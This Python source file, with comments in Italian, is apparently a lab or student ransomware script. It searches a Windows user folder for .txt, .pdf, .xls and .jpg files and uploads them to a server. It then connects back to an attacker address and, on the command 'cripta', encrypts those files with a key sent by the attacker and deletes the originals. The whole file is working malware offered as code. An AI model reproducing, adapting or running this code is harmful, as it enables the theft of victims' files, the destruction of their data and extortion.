import os
import requests
import socket
import subprocess
import pyAesCrypt


url="http://127.0.0.1/upload.php" 
root='C:\\Users\\Lenovo\\Desktop\\file da stampare'#'C:\\Users'#impostare percorso di partenza per recupero file

estensioni=['.txt','.pdf', '.xls','.jpg']


for directory, subdirectory, files in os.walk(root):
    os.chdir(root)
    for file in files:

        corrispondenza=False
        a, estensione_file=os.path.splitext(file)
        
        for i in estensioni:
            if i== estensione_file:
               corrispondenza=True
                
        try:
           os.chdir(directory)

           if corrispondenza:
              print(file)
              file_da_inviare={'name':open(os.path.abspath(file),'rb')}
              res=requests.post(url,files=file_da_inviare)

        except FileNotFoundError:
           continue

      

def reverse_shell():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect(('192.168.137.1', 8080)) # indirizzo ip e porta attaccante 
    
    while True: 
        command = s.recv(1024).decode() # riceve i comandi dell'attaccante
        print(command)
                                                                  
        
        if 'cripta' == str(command):
        
            
            key_value= str(s.recv(1024).decode())
            print(key_value)
            print('accesso funzione')
            cripta_file(key_value)
            s.close()
            break
            
                             

        if 'terminate' in str(command): # se riceve il comando terminate esce dal ciclo e interrompe la connessione
            print('chiusura connessione')
            s.close()
            break 

    

def cripta_file(key_cifra):
    
    for directory, subdirectory, files  in os.walk(root):
        os.chdir(root)
        for file in files:

         corrispondenza=False
         a, estensione_file=os.path.splitext(file)

         for i in estensioni:
            if i== estensione_file:
                corrispondenza=True
                
         try:

             os.chdir(directory)

             if corrispondenza:
                #cripta i file con chiave inviata dal server attaccante                 bufferSize = 64 * 1024
                nuovo_file=os.path.basename(file)+ '.aes'
                bufferSize=64*1024
                pyAesCrypt.encryptFile(file, nuovo_file, key_cifra, bufferSize)
                os.unlink(file)
         except  FileNotFoundError:
                continue
         except  PermissionError:
                 continue

reverse_shell()


